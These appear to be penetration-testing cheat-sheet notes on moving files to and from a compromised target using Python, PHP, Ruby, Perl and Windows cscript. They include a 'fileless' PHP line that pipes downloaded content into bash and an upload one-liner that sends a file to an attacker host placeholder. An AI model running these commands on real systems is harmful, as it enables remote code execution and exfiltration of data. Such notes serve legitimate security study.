# Transferring Files with Code

## Download

Python2 / Python3 one-liners — use whichever is installed:

```bash
python2.7 -c 'import urllib;urllib.urlretrieve("<URL>", "<OUTFILE>")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OUTFILE>")'
```

PHP — `file_get_contents` is the cleanest one-liner:

```bash
php -r '$file = file_get_contents("<URL>"); file_put_contents("<OUTFILE>",$file);'
```

PHP fileless — pipe straight to bash:

```bash
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

Ruby / Perl when nothing else is available:

```bash
ruby -e 'require "net/http"; File.write("<OUTFILE>", Net::HTTP.get(URI.parse("<URL>")))'
perl -e 'use LWP::Simple; getstore("<URL>", "<OUTFILE>");'
```

JavaScript + cscript — Windows only, write `wget.js` to disk first:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1; BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript.exe /nologo wget.js <URL> <OUTFILE>
```

VBScript + cscript — write `wget.vbs` to disk first:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1 : .open : .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs <URL> <OUTFILE>
```

---

## Upload

Python3 requests one-liner → uploadserver:

```bash
python3 -m uploadserver
```

```bash
python3 -c 'import requests;requests.post("http://<LHOST>:8000/upload",files={"files":open("<FILE>","rb")})'
```

> [!tip] Language priority on an unknown target: try Python3 → Python2 → PHP → Ruby → Perl. On Windows with no PowerShell: JS/VBS via cscript is pre-installed on every Windows since 98.